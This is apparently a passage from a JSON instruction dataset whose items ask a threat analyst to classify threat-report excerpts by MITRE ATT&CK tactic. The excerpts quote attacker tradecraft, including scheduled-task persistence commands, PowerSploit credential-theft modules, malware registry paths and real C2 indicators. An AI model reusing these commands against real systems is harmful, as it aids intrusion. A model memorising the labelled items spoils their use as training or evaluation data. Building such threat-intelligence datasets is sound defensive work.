        "input": "Described attack activity: The initial execution for this intrusion took place with the use of BazarLoader malware via rundll32.\nImmediately after the execution, the malware contacted two of its C2 IPs:\nWe then observed the threat actor using the BazarLoader injected process, svchost.exe, to download Cobalt Strike and save it under:\nbefore executing it using rundll32.exe.\nThroughout the intrusion, the threat actors utilized Cobalt Strike beacons and PowerShell to execute their payloads prior to interactively remoting into hosts using RDP and AnyDesk.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: For the first time in over a year, the most observed means of gaining initial access was the exploitation of public-facing applications, accounting for nearly 40 percent of engagements when initial access could be determined. This is a significant departure compared to previous quarters, where the use of valid accounts was consistently a top observed technique leveraged for initial \naccess. While we still observed adversaries leverage compromised credentials and valid accounts to gain access, this shift is likely largely due to the number of web shell and ransomware incidents that took advantage of poorly patched or publicly exposed applications. \nExploitation of public facing applications was the top infection vector when identified in Q4 \nLooking forward: Since early December 2024, Talos IR has observed a surge in passwordspraying attacks, leading to user account lockouts and denied VPN access. These attacks are often characterized by large volumes of traffic. For example, one organization reported nearly 13 million attempts were made in 24 hours against known accounts, indicating the adversary was likely running automated attacks. This activity primarily affected organizations in the public administration sector and was likely random and opportunistic. Although adversaries have been using password-spraying attacks for credential access for years, the sheer volume of authentication attempts in quick succession is a reminder that organizations should continue to stress the importance of MFA and strong password policies to limit unauthorized access attempts. ",
        "output": "initial access",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1070 Indicator Removal on Host | Clearing of event logs using wevutil,   \nremoval of USNJournal using fsutil, and deletion of slack space on drive using   \ncipher.exe   \nT1089 Disabling Security Tools | Stopping or tampering with antivirus and   \nother security using ProcessHacker and exploitation of vulnerable software   \ndrivers ",
        "output": "defense evasion",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Microsoft 365 Defender built-in detection: Risky user created global admin \nThis detection will alert users based on the risk score proved by Azure AD Identity Protection when a new global admin was created by a user that had a risky sign-in. An attacker might have compromised the user account to perform lateral movement. \nInvestigate the new global admin account to determine if it was created legitimately and if the user account that performed the action was compromised. ",
        "output": "privilege escalation",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Tor2Mine Server:\nCobalt Strike C2:\nIP Address: 5.188.86.237\nConnection to the following URIs was observed:\nCobalt Strike Server Config:",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The attacker used PowerShell to create new tasks on remote machines: \n\\$scheduler $=$ New-Object -ComObject   \n(\"Schedule.Service\");\\$scheduler.Connect(\\$env:COMPUTERNAME);\\$folder $=$   \n\\$scheduler.GetFolder(\"\\Microsoft\\Windows\\SoftwareProtectionPlatform\");\\$task $=$   \n\\$folder.GetTask(\"EventCacheManager\");\\$definition $=$   \n\\$task.Definition;\\$definition.Settings.ExecutionTimeLimit $=$   \n\"PT0S\";\\$folder.RegisterTaskDefinition(\\$task.Name, $\\$9$ definition,6,\"System\",\\$null,5);echo \"Do \nThey also attempted this on a number of machines using schtasks.exe directly. For example: \nC:\\Windows\\system32\\cmd.exe /C schtasks /create /F /tn   \n\"\\Microsoft\\Windows\\SoftwareProtectionPlatform\\EventCacheManager\" /tr   \n\"C:\\Windows\\SoftwareDistribution\\EventCacheManager.exe\" /sc ONSTART /ru system   \n/S [machine_name] ",
        "output": "lateral movement",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The Mantis cyber-espionage group (aka Arid Viper, Desert Falcon, APT-C-23), a threat actor believed to be operating out of the Palestinian territories,is continuing to mount attacks, deploying a refreshed toolset and going to great lengths to maintain a persistent presence on targeted networks.\nWhile the group is known for targeting organizations in the Middle East, the most recent campaign uncovered by Symantec, byBroadcom Software, focused on organizations within the Palestinian territories, with malicious activity beginning in September 2022 and continuing to at least February 2023. This targeting is not unprecedented for Mantis and Symantec previously uncovered attacks against individuals located in the Palestinian territories during 2017.",
        "output": "other",
        "source": "Symentec"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The compromised user had local administrative privileges on their machine which allowed the threat actor to leverage tools requiring higher permissions.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Multiple discovery commands were executed by the threat actors. Each command was executed via thetemp.ps1file with the input commands via base64 command line arguments.\nDuring the intrusion, the threat actors executed the following for discovery tasks.\nList disk information\nList process\nGet information about Windows Defender service\nGet current time on the victim's workstation\nGet time zone\nUse TRACERT in order to discover network infrastructure\nEnumerate local accounts\nGet information on current user\nEnumerate files\nA PowerShell function based on the PowerSploitConvert-LDAPPropertycode was used in order to retrieve information on domain accounts:\nQuery AD & SAM account name\nComputer and network information discovery\nGet the account information for logged-on user of a Windows machine\nGets the status of antimalware software on the computer.\nList environment variables\nGet public IP address",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: An authentication protocol verifies the legitimacy of a resource or identity. When a user signs into a website, that website uses a methodology to confirm the authenticity of the resource requesting access. In simpler terms, the authentication process involves signing in with a password-made possible by the user knowing the password anticipated by the website. The Kerberos protocol serves as the main authentication framework for this process in on-premises Active Directory. ",
        "output": "other",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: From the statistics in this report, we can conclude that cyberattacks target all types of businesses around the globe. It means that having a plan to defend and quickly respond to such attacks is no longer an option; it's a must, regardless of business type. \nMaintaining and improving an already existing incident response plan will accelerate handling of security breaches through proper containment, analysis and eradication of infected elements in the network. The risk of re-infection is reduced and defense against complex attacks is improved by utilizing the lessons learned from each incident to enhance the existing security process in the environment. \nAlong with a powerful auditing policy and a log retention period of at least six months to one year, developing guided procedures for proper handling of digital evidence will definitely help in faster and more complete analysis of incidents by experts. This results in quicker containment and reduces possible loss of assets, data or reputation. \nFrequent security assessments have proved effective in discovering weaknesses early enough to fix them and hardening overall infrastructure before adversaries reveal those weaknesses and make use of them in an offensive attack. \nFurthermore, we can see that humans are still the weakest link in the security chain. Even with a highlevel security policy and security controls in place, a single employee uneducated in information security can trigger a major compromise of the internal environment and assets. ",
        "output": "other",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: An account named \"nuuser\" was created by one of the Cobalt Strike Beacons. As these commands were run on a domain controller, it essentially added the account to the Built-in Administrators domain group, granting it administrative privileges in the AD domain.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The first lateral movement occurred to the domain controller not affected by the use of CVE-2020-1472. An executable was transferred to it via SMB using a domain administrator account.\nAfter transferring the exe, the threat actors utilized WMI from the beachhead host to execute the file.\nThe presence of the EICAR strings point to the Cobalt Strike software being used as atrial version.\nThey accessed the GPO's for the domain but none were modified or added.\nShortly there after we saw a Cobalt Strike DLL transferred via the RDP connection.\nRDP was used to pivot from the main domain controller and distribute the final ransomware payload enterprise wide.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Another important function of Wintapix.sys is to set up persistence. This is first done by creating register keys at the following places:\n\\\\REGISTRY\\\\MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\WinTapix \n\\\\REGISTRY\\\\MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SafeBoot\\\\Minimal\\\\WinTapix.sys \n\\\\REGISTRY\\\\MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SafeBoot\\\\Network\\\\WinTapix.sys\nInterestingly, the driver is set to load in Safe Boot. Safe Boot, also known as Safe Mode, is a diagnostic startup mode in Windows that launches the system with minimal drivers and services. It is designed to help users troubleshoot and resolve software or driver-related issues that might prevent the system from starting normally. Loading the driver in Safe Boot also adds another layer of persistence to the mix.\nAll created registry keys are monitored using the ZwNotifyChangeKey(). This Windows kernel-mode function allows monitoring changes to a specified registry key. The function notifies the caller of any changes to the registry key by signaling the event or invoking the APC (asynchronous procedure call) routine. This makes it useful for applications that need to react to registry modifications in real time. This allows the malware to reset itself in the registry after it has been removed.\nIt also starts a new thread with PsCreateSystemThread() to monitor the file location of Wintapix.sys. It uses NtNotifyChangeDirectoryFile() to monitor changes in the file. Should Wintapix.sys be deleted, it will write it back to the same location.",
        "output": "persistence",
        "source": "Fortinet"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In the past year or so, we have observed malware variants such as IcedId and Trickbot being embedded into macro-based Office documents and delivered as email attachments.\nIn majority of those intrusions, the Office (Excel or Word) document spawns suspicious processes such as Living-of-the-land binaries (regsvr32.exe, rundll32.exe) and Windows Command Line shell (cmd.exe, powershell.exe).\nExample:\nProcess Chain  XLSB file weaponized with Trickbot\nThe below Sigma rules can be used for creating detection rules:\nOffice Applications Spawning LOL Bins:\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_lolbins_by_office_applications.yml\nOffice Applications Spawning WMI Command Line:\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_office_applications_spawning_wmi_commandline.yml\nExcel Proxy Executing Regsvr32 with Payload:\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_office_from_proxy_executing_regsvr32_payload.yml \nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_office_from_proxy_executing_regsvr32_payload2.yml\nOffice Applications Spawning Windows Shell:\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_office_shell.yml\nOffice Applications MS Office Product Spawning Exe in User Dir:\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_office_spawn_exe_from_users_directory.yml\nRecently, there has been an increase in the use of \"ISO\" image containers to deliver the initial payload to evade Mark-of-the-Web (MOTW).\nhttps://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/ \nhttps://thedfirreport.com/2022/04/25/quantum-ransomware/\nFor detecting mounting of ISO images, we can look into \"Microsoft-Windows-VHDMP/Operational\" log source.\nEvent IDs:1 and 12\nSigma Rules:\nISO Image Mount:\nhttps://github.com/SigmaHQ/sigma/blob/04f72b9e78f196544f8f1331b4d9158df34d7ecf/rules/windows/builtin/security/win_iso_mount.yml\nISO or Image Mount Indicator in Recent Files:\nhttps://github.com/SigmaHQ/sigma/blob/d459483ef6bb889fb8da1baa17a713a4f1aa8897/rules/windows/file_event/file_event_win_iso_file_recent.yml\nRundll32 From Abnormal Drive\nhttps://github.com/SigmaHQ/sigma/blob/8bb3379b6807610d61d29db1d76f5af4840b8208/rules/windows/process_creation/proc_creation_win_rundll32_not_from_c_drive.yml",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Due to the disproportional amount of phishing cases we reported, the technique associated with \"Malicious File  T1204.002\" is at the top of the list.\nThe following will cover a few of the TTPs that occur on a frequent basis:\nPowerShell continues to be a favorite among threat actors for its flexibility and ability to stay in memory. There are some very common tasks that threat actors have been observed using PowerShell for, however, in general, due to its versatility, PowerShell can be used to achieve many different tasks. For this reason, it is important for organizations to ensure they have visibility into how PowerShell is being used in their environment. This can be achieved through Endpoint Protection & Response (EDR) solutions or by leveraging a SIEM tool to analyzePowerShellhost-related logs, such as those fromPowerShelllogging events.\nSome common PowerShell use cases include:\nWe have observed continued usage of remote services created for the purposeof lateral movement and privilege escalation.These services are created to be run once as SYSTEM, and execute the threat actors' payload. This is common among Cobalt Strike lateral movement capabilities. However, we have also observed other payloads being run, such as Sysinternals Procdump.\nDLLs are a very common way for threat actors to package their payloads for execution, this includes payloads related to malware such as IcedID, Emotet and Cobalt Strike beacons. The two most common ways threat actors execute exports from these DLLs is viarundll32andregsvr32.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The server's CPU was maxed out at 100% and likely would have caused issues in an enterprise environment. At the time of this writing the wallet used for mining barely had anything in it and appears to be dedicated to us.\nEnjoy our report? Please consider donating $1 or more to the project usingPatreon. Thank you for your support!\nWe also have pcaps (exploit pcap), files, memory images, and Kape packages availablehere.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The certificate shows the serial number - 61b0feca645af9296aa422d2c289e1d13593dbb6 - and fingerprint - 134a3d105eef24fab27ed0fb3729e271306bde6dc4e9d2a4a5c5d1c82b0390fe we discovered five hosts containing the same certificate: \n149[.]28[.]54[.]212 \n95[.]179[.]246[.]73 \n149[.]28[.]36[.]160 \n45[.]76[.]68[.]112 \n3[.]86[.]255[.]88 \nOur analysis revealed that the backdoors communicated over HTTPS to the server 149[.]28[.]54[.]212 and the Alchimist user interface was accessible via ports 8443 and 50423 from servers 149[.]28[.]54[.]212, 95[.]179[.]246[.]73, and 149[.]28[.]36[.]160. \nThe rise of all-inclusive C2 frameworks \nOur discovery of Alchimist is yet another indication that threat actors are rapidly adopting off-theshelf C2 frameworks to carry out their operations. A similar ready-to-go C2 framework called \"Manjusaka'' was recently disclosed by Talos. Alchimist also comprises a single-file based, readyto-go C2 tool along with its remote access tool Insekt, implemented in GoLang and compiled to target Windows and Linux machines. \nThe functionality of Manjusaka and Alchimist's web interfaces exhibiting remote administration capabilities, performed through the RATs, signifies the plethora of functionalities packed into these C2 frameworks. A threat actor gaining privileged shell access on a victim's machine is like having a Swiss Army knife, enabling the execution of arbitrary commands or shellcodes in the victim's environment, resulting in significant effects on the target organization. \nEndpoint security teams should implement layered security defense, be constantly vigilant in monitoring the privileged operations in their environments and detect any unauthorized programs attempting to gain root privileges. Network security teams should be looking for any unusual traffic to their organizations' environment and be cautious about suspicious artifacts downloaded to their network. Having controlled download and file execution policies on the endpoints and servers can effectively protect organizational assets from threats. \nOrganizations and users who are using the vulnerable versions of polkits pkexec utilities should patch their systems following the mitigation steps as advised by RedHat. For the users of Unixlike systems other than Linux, who cannot find patches for their operating systems, a workaround could be implemented by removing the SUID-bit of pkexec utility. \nCoverage \nWays our customers can detect and block this threat are listed below. \nCisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here. \nCisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks. \nCisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free here. \nCisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat. \nCisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products. \nUmbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here. \nCisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them. \nAdditional protections with context to your specific environment and threat data are available from the Firewall Management Center. \nCisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network. \nThe following ClamAV signatures have been released to detect this threat: \nOsx.Exploit.CVE_2021_4034-9951522-2   \nUnix.Exploit.CVE_2021_4034-9951523-0   \nUnix.Exploit.CVE_2021_4034-9951524-0   \nUnix.Exploit.CVE_2021_4034-9951525-0   \nUnix.Exploit.CVE_2021_4034-9951526-0   \nUnix.Malware.Insekt-9955436-0   \nWin.Malware.Insekt-9955440-0   \nUnix.Malware.Alchimist-9955784-0   \nMultios.Malware.Insekt-9961177-0 \nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. Snort SIDs for this threat are 58955 - 58956. \nIOCs \nThe IOC list is available in Talos' Github repo here. \nSHARE THIS POST ",
        "output": "command and control",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: All your data belong to me! \nInvoke-TokenManipulation - Lists available logon tokens. Creates processes with other users logon t Invoke-CredentialInjection - Create logons with clear-text credentials without triggering a suspici Invoke-NinjaCopy - Copies a file from an NTFS partitioned volume by reading the raw volume and pars Invoke-Mimikatz - Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump c Get-Keystrokes - Logs keys pressed, time and the active window.   \nGet-GPPPassword - Retrieves the plaintext password and other information for accounts pushed throug Get-GPPAutologon - Retrieves autologon username and password from registry.xml if pushed through Gr Get-TimedScreenshot - A function that takes screenshots at a regular interval and saves them to a f New-VolumeShadowCopy - Creates a new volume shadow copy.   \nGet-VolumeShadowCopy - Lists the device paths of all local volume shadow copies.   \nMount-VolumeShadowCopy - Mounts a volume shadow copy.   \nRemove-VolumeShadowCopy - Deletes a volume shadow copy.   \nGet-VaultCredential - Displays Windows vault credential objects including cleartext web credentials Out-Minidump - Generates a full-memory minidump of a process.   \nGet-MicrophoneAudio - Records audio from system microphone and saves to disk. ",
        "output": "exfiltration",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The initial access was achieved by the user navigating to a SEO-poisoned website via Google search. Once opened the site masquerades as a forum and with a download link to an 'Implied Employment Agreement' document.\nIn our previous analysis of Gootloader, detailed in our report, \"SEO Poisoning: A Gootloader Story,\" we revisit the same initial access technique employed by threat actors. For a better understanding, we've included avideoin our previous report that visually demonstrates the user's journey from SEO poisoning to encountering Gootloader malware.\nThe 'Implied Employment Agreement' turned out to be a zip archive containing the GootLoader multistage loader. We can see from the below that the zip was downloaded from a website on the internet (ZoneId=3).\nBelow depicts the process of the start of the Gootloader infection:",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: SHA256 Hashes \u2013 Ukrainian Variant\n26f2bf1fc3ee321d48dce649fae9951220f0f640c69d5433850b469115c144fe4c698f5a005a74570a10a69a82317b0c87207934fe82907ee7df3348096cd66c\nSHA256 Hashes \u2013 Original Bucbi\nad16c5246675b807cd04c33f5186f26c1c677e7b2f3baea3305b23e7cac34f8ebe63b6a01e57a7a409647bdf221a37a0be0d470d488136228a4c1d1defbd05f498e901f362641ae1fc6527215f496c9fd5de2d7f69b136ac610e453469831d072f8597a18c24d9c7ee4442f607b518c065bfef376c554ea80b303875bb0f5c4f713413ee1a008b91a6afb29c52d2beda829778b8072c5ba5171bb50277104ebc8577216183fc19767788e3d078eaeb754d18141c80c2554f9c3c359cc470c4f6feb6eccc9d254fb0e1c818be50ec183a472ed064d4071f380ac131c262da06890ed72a28ba5bac7f44f9e4519db5f8c8d94076d85a929c2004da1cba99559610ea7896c06595a261b140f1ce192230e0fc0bdb9213023db0a5d1b07eb91f7af327ba82a72339fef306ef6ce83c055c35caa7bf7116eea0edad22966d297661f370d59a3f1f508668b1ae214022a140fb96f90c221a192443b87a1fbe621cee0bfeecc0baccecabeddc8f0e07b3a7aa54d7f13d60e232b7a538b10cd773b4c5e5766b3a58b5ff86b1070c186b72854c69fff6fc11ce384d70c71db66f6c18a8c8a65293abd10e7c4a306ddfae94c67df2db411c4a29ca71a1ca8169ee640a8ed362f199dedfffef4eb71c33bdf22f4a9b3276f8a831999788059163fae43db48e8988f592efb88b4998b54c9736898339811bda3578b27e0a4a03ed9a4c5ca36360fb4c67f4fade5b00d1f57810ec379df3c39b546ead0865296a077e6a8b2f42ce122be2e52159c3e441c43b81a334b49b7763cf6a2265768d8e2df45478fc6a30645cdf85546f51862c7dc4750016f872683bc060cc34e4b462e01445a8abfd9b1b25ab5a6e5291a509c4ad94ab16c25925feaf9e6e8b217494596f76888202558d32c77167d08ab8594c5df99dd162ae975d8ceb1d169108fe0d70ac8df11a6e279ea746bc4692ff32acb697da0147ec056700fc095f8ff248317548bcbdcb56da464cd45f17bacf52b6497396e2c801625bd4068790d9d9515a087584f63014ff3948a11b7469882bda4e8fcf89600aaaf84d5d5b4bfcea1896acc4ed2ca563492d05b5bd0fd132dbb92142f6c8911325899c7a1cd9a462edf720ce27d47c697266cac58ba555fb3d7dd6e0afd08ecfc57702f3e3a9df96e9e4eef8b722d6b561b91cce444e9dc768bd93e0404e67f79900598ef03f175a10887c7b94c30c06fee4e154ad90945be70aae671aeefd103fa0947d957fdc973848221ada635cb497c79c027bab2b9a30c613b2c603296bcb29d63c8f30c27864c860955b3ebda1dc73eaaaa11ef3585bf389fcc3301c20c0636a144778d3ffb657110d911d1bd65593e94ef433a2597cf01591e96067180e548cd418327476931c642e01bdff4ec6ee80323c2365dfd4cfeba9a64f043df026a98b026ecb1e757c9df532f064cc7c24dd062e8538984a9d640600b91ff6c3a0404a5caf4f174c513c7f16fba45d753520b6c97bace23dbbece93ecd9eb9ac3cea1d8c9b4ccf6dfca43dc47556f51719dfeac4f52a90d52188c3b3e9145d77f612da784510c968564aa0d46e9e907d245b8854a8277379fb59d65102c2fd440c0bf850939e2a775a3bebb4cb1d0957912344ff93cba65088c4aed2bd2631e8a5788604520955104e05dcfb4b0c7cc35bbd4327a4212069eab5747944c5e8dedb82f02f695b0248d026a733f0c656485d996b50610b3c0ab86d7136bde215401c2f30154e818b4b18d3a4457eea11cc17e5e06f7d5e7c52979b5e7b75ea083e46a59e73ea245872e72084f44099dfb355d874db6f2d141c2789a041ccfa91775508fae2fedd86c48f0089abe00a15608834007b61eb4426bf034e8923733100fccf872ffebe2e05aea3d9f63fef26f2bf1fc3ee321d48dce649fae9951220f0f640c69d5433850b469115c144fe6edf7c043348efe02d94c97a4d06ec735fb90a77ea290509e03991edadb247164c5a0fd976f04c63faa32e1a74edd59c5c39ce0e143e69d464f95872b8357e8e59e06b077b8ac0472cb95401bf5d99301e0e807ed74d698a3953bc96c0eb568e\nCommand and Control Servers \u2013 Original Bucbi\nbbb.bth.in[.]uashalunishka12[.]orgceckiforeftukreksyxomoa[.]org87.249.215[.]196chultolsylrytseewooketh[.]biz\nAttacker IP Addresses\n31.184.197.6931.44.191.25179.117.151.23646.161.40.11191.101.31.126",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Raspberry Robin first uses cmd.exe to read and execute a file stored on the infected external drive. The command is consistent across Raspberry Robin detections we have seen so far, making it reliable early evidence of potential Raspberry Robin activity. Typically the command line includes cmd /R < to read and execute a file. The use of cmd /R < is not unique to Raspberry Robin, but the filename pattern is unique. The filename is made up of five to seven random alphanumeric characters and a variety of file extensions. Some of the file extensions we've seen include .usb, ico, .lnk, .bin, .sv, and .lo. Additionally, the command has sometimes included type, which is a built-in command to display the contents of a file. \nHere's an example of what the whole command might look like: \nProcessspawned \nCommand Line:\"cmd.exe/r C:\\WINDowS\\system32\\cmd.exe<xjHfK.USb \nFigure 3: Raspberry Robin cmd.exe command \nNext, cmd.exe typically launches explorer.exe and msiexec.exe. With Raspberry Robin, explorer.exe's command line can be a mixedcase reference to an external device; a person's name, like LAUREN V; or the name of the .lnk file, like the figure below. The name here has been modified from the .lnk file name to LNkFILe. While we aren't sure of this command's exact purpose, we've consistently observed it in Raspberry Robin detections. \nProcessspawned bycmd.exe \nCommand Line: ExpLoRER \"USB Drive\" \nProcessspawnedbycmd.exe \nCommand Line: eXPLOReR LNkFILe \nFigure 4: Mixed-case command referring to device or name \nRaspberry Robin extensively uses mixed-case letters in its commands. Adversaries sometimes use mixed-case syntax in an attempt to evade detection. Case-sensitive, string-based detections written to detect evil may not fire on eViL, but cmd.exe is case-insensitive and has the flexibility to read and process both commands the same way. ",
        "output": "execution",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Despite the network worm's self-replicating feature, the attackers did some manual lateral movement before starting on the destructive malware. We believe this was done to look for a better spot to release the worm. They seemed to be moving through the network via Psexec and stolen credentials, opening a default meterpreter port (TCP 4444) and downloading and running a backdoor (meterpreter). The attackers also checked the network configuration, potentially searching for servers attached to multiple networks or VPN links in order to penetrate adjacent networks that could be linked to the Olympic Committee infrastructure. \nOne of the hosts in the network of the affected ski resort hotel had Kaspersky Lab's system watcher component enabled, which collected quite a few of the artifacts used by the attackers for lateral movement. According to the telemetry from this host, the attackers entered the system on 6 February, 2018. They used three types of PowerShell scriptlets: TCP 4444 port opener, ipconfig launcher and a downloader. \nBased on telemetry we received from one of the hosts, we built a timeline of the attackers' activity and a histogram showing when the attackers started executables on the system. \nFrom this we can see that the attackers were mostly busy outside of office hours according to Korean Standard Time $\\mathrm{(UTC+}9\\mathrm{)}$ , perhaps to attract less attention or simply due to their own timezone. ",
        "output": "lateral movement",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors predominately used Cobalt Strike's jump psexec module to move to new hosts. The event ID 7045 (A new service was installed in the system) in System.evtx showed clear evidence of the malicious service being installed.\nThe DFIR Report'sdefender's guide to Cobalt Strikediscusses this in further detail.\nAs seen below, when filtered to these events, we observed the threat actor moving to a new system every 5-20 minutes.\nAs we mentioned in the discovery phase, threat actors also used atexec to execute commands on remote hosts. Impacket's atexec module allows the remote execution of commands on a Windows system by leveraging the Task Scheduler service. The module registers a task on a remote system that would execute the instructed command. The task would then be deleted upon successful execution. The example below is from the Security event logs, event ID 4698.\nTo showcase the hardcoded lines of code responsible for the observed execution flow, we have included a snippet from atexec's official GitHub page in the screenshot above. Threat actors used Cobalt Strike to facilitate the execution of this module.\nIn some other cases, we saw threat actors executing the below command from the beachhead host toward a number of remote hosts.\nThis command uses Windows Management Instrumentation CommandLine (WMIC) to remotely retrieve the executable paths of all running processes from a number of remote hosts.\n/node:<remote host>: specifies the remote host. \nprocess: represents the WMI class to be queried; in this case, it's related to running processes on the target system. \nget executablepath: is to retrieve the property 'ExecutablePath', which contains the complete path to the executable for each running process.\nWe've created a chart displaying the times (UTC) when threat actors were active in the network. The data is based on a sample of affected hosts, but the pattern of activity remained consistent throughout the intrusion.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: A DocuSign themed Excel xls was opened and macros were enabled. Thanks to@ffforwardfor the document as well as the sandbox run leading up to the xls file.\nThe macro in this maldoc is using Excel 4 Macros.\nDocuSign was again the social engineering format of choice.\nAfter execution, Excel called out to:",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
